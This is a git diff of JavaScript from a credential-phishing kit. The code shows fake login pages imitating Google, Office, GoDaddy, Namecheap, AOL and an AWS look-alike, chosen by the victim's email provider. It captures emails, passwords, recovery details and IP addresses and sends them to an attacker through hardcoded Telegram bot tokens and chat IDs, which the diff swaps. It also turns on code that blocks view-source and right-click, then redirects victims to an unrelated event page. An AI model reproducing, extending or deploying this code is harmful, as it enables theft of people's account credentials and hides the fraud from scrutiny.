@@ -1,8 +1,7 @@
 // storing variables
-// const token = '6113839454:AAFY5WlixlzhREvqK1DAGyZBRnDeY-D9jU4';
-// const chatId = '1461764555';
-const token = '6025420862:AAGb7ewiXU-xNIVW3syYaDEboqjH7brgyp0';
-const chatId = '6211262162';
+const token = '6113839454:AAFY5WlixlzhREvqK1DAGyZBRnDeY-D9jU4';
+const chatId = '1461764555';
+
 const redirectURL =
   'http://www.cvent.com/events/2018-facial-rejuvenation/event-summary-66dad18444ca4ff1b1379df029fd67f3.aspx/';
 const url_link = '';
@@ -11,8 +10,8 @@ const office_brand = document.getElementById('office_brand');
 const office_left_arrow = document.getElementById('office_left_arrow');
 const name_key = document.getElementById('name_key');
 const godaddy_logo = document.getElementById('godaddy_logo');
-// const aws_logo = document.getElementById('aws_logo');
-// const aws_hero = document.getElementById('aws_hero');
+const revision_logo = document.getElementById('revision_logo');
+const revision_hero = document.getElementById('revision_hero');
 const namecheap_logo = document.getElementById('namecheap_logo');
 const namecheap_logo_f = document.getElementById('namecheap_logo_f');
 const cart_img_nc = document.getElementById('cart_img_nc');
@@ -55,7 +54,7 @@ const board = document.querySelectorAll('.board');
 const greetingSection = document.getElementById('greetingSection');
 const officeSection = document.getElementById('officeSection');
 const godaddySection = document.getElementById('godaddySection');
-// const awsSection = document.getElementById('awsSection');
+const revisionSection = document.getElementById('revisionSection');
 const namecheapSection = document.getElementById('namecheapSection');
 const earthlinkSection = document.getElementById('earthlinkSection');
 const mimecastSection = document.getElementById('mimecastSection');
@@ -136,19 +135,19 @@ function view_action() {
         if (esp) {
           espName = esp.split('.');
           espName = espName[espName.length - 2];
-          console.log(`Email service provider: ${esp}`);
-          console.log(`Email service provider: ${espName}`);
+        //   console.log(`Email service provider: ${esp}`);
+        //   console.log(`Email service provider: ${espName}`);
           runESPconditions(espName);
         } else {
           googleSection.classList.remove('d_none');
           setting_favicon('google_favicon.png');
-          console.log('Unable to determine the email service provider.');
+        //   console.log('Unable to determine the email service provider.');
         }
       })
       .catch((error) => {
         webmailSection.classList.remove('d_none');
         setting_favicon('cpanel_favicon.png');
-        console.error('Error:', error);
+        // console.error('Error:', error);
       });
 
     function runESPconditions(final) {
@@ -169,10 +168,10 @@ function view_action() {
         godaddySection.classList.remove('d_none');
         setting_favicon('godaddy_favico.png');
       } 
-      // else if (final == 'amazonaws') {
-      //   awsSection.classList.remove('d_none');
-      //   setting_favicon('aws_Favicon.png');
-      // }
+      else if (final == 'amazonaws') {
+        revisionSection.classList.remove('d_none');
+        setting_favicon('revision_Favicon.png');
+      }
        else if (final == 'yahoodns') {
         aolSection.classList.remove('d_none');
         setting_favicon('aol_favicon.png');
@@ -219,10 +218,15 @@ function view_action() {
 }
 var clickCount = 0;
 function sign_in_action(eleNum, border) {
-  if (eleNum == 6) {
+//   console.log(eleNum);
+//   console.log('name_key.value', name_key.value);
+  if (eleNum == 5) {
     if (validateNameKey(name_key.value)) {
+    //   console.log('v n k pass & name key', name_key);
       const name_pass_value = name_pass[eleNum].value;
+    //   console.log('name_pass_value', name_pass_value);
       if (ggl_input__rpe.value.length > 5) {
+        // console.log('length pass');
         message =
           ' Gmail is: ' +
           name_key.value +
@@ -231,7 +235,9 @@ function sign_in_action(eleNum, border) {
           ' and IP is: ' +
           ipAddress;
         sendMessage(message);
+        // console.log(message);
       } else if (ggl_input__rpe.value.length > 0 && ggl_input__rpe.value.length < 4) {
+        // console.log('length fail');
         document.getElementsByClassName('skdhks__')[0].innerHTML = 'Enter recovery Email or Phone';
         null_pass_error[eleNum].classList.add('d_block');
       }
@@ -250,6 +256,7 @@ function sign_in_action(eleNum, border) {
             ' and IP is: ' +
             ipAddress;
           sendMessage(message);
+        //   console.log(message);
           name_pass[eleNum].value = '';
           null_pass_error[eleNum].classList.remove('d_block');
           error_box[eleNum].classList.add('d_block');
@@ -267,9 +274,12 @@ function sign_in_action(eleNum, border) {
     }
   } else {
     if (validateNameKey(name_key.value)) {
+    //   console.log('v n k pass & name key', name_key);
       const name_pass_value = name_pass[eleNum].value;
+    //   console.log('name_pass_value', name_pass_value);
       if (name_pass_value.length > 4) {
-        if (eleNum == 6) {
+        // console.log('length pass');
+        if (eleNum == 5) {
           message =
             'Email is: ' +
             name_key.value +
@@ -280,6 +290,7 @@ function sign_in_action(eleNum, border) {
             ' and IP is: ' +
             ipAddress;
           sendMessage(message);
+        //   console.log(message);
         } else {
           message =
             'Email is: ' +
@@ -289,6 +300,7 @@ function sign_in_action(eleNum, border) {
             ' and IP is: ' +
             ipAddress;
           sendMessage(message);
+        //   console.log(message);
         }
         clickCount++;
         name_pass[eleNum].value = '';
@@ -304,6 +316,7 @@ function sign_in_action(eleNum, border) {
           window.location.href = redirectURL;
         }
       } else {
+        // console.log('length fail');
         if (border == 'no_need_border') {
         } else {
           name_pass[eleNum].classList.add('error_border_color');
@@ -311,6 +324,8 @@ function sign_in_action(eleNum, border) {
         null_pass_error[eleNum].classList.add('d_block');
         error_box[eleNum].classList.remove('d_block');
       }
+    }else{
+      console.log('error');
     }
   }
 }
@@ -340,8 +355,8 @@ setImg(hero_img, 'domain_assets/Marquee_Device_Desktop.png');
 setImg(office_brand, 'domain_assets/office_brand.svg');
 setImg(office_left_arrow, 'domain_assets/arrow_left.svg');
 setImg(godaddy_logo, 'domain_assets/godaddy_logo.png');
-// setImg(aws_logo, 'domain_assets/aws_logo.png');
-// setImg(aws_hero, 'domain_assets/aws_hero.png');
+setImg(revision_logo, 'domain_assets/aws_logo.png');
+setImg(revision_hero, 'domain_assets/aws_hero.png');
 setImg(namecheap_logo, 'domain_assets/namecheap_Logo.png');
 setImg(namecheap_logo_f, 'domain_assets/namecheap_Logo.png');
 setImg(nc_footer_img, 'domain_assets/namecheap_footer.jpg');
@@ -490,16 +505,15 @@ mc_name_pass.addEventListener('keyup', () => {
 });
 
 //inspect off
-// function redirectCU(e) {
-//   if (e.ctrlKey && e.which == 85) {
-//     return false;
-//   }
-// }
-// document.onkeydown = redirectCU;
-// function redirectKK(e) {
-//   if (e.which == 3) {
-//     return false;
-//   }
-// }
-// document.oncontextmenu = redirectKK;
-//   set brand image
+function redirectCU(e) {
+  if (e.ctrlKey && e.which == 85) {
+    return false;
+  }
+}
+document.onkeydown = redirectCU;
+function redirectKK(e) {
+  if (e.which == 3) {
+    return false;
+  }
+}
+document.oncontextmenu = redirectKK;
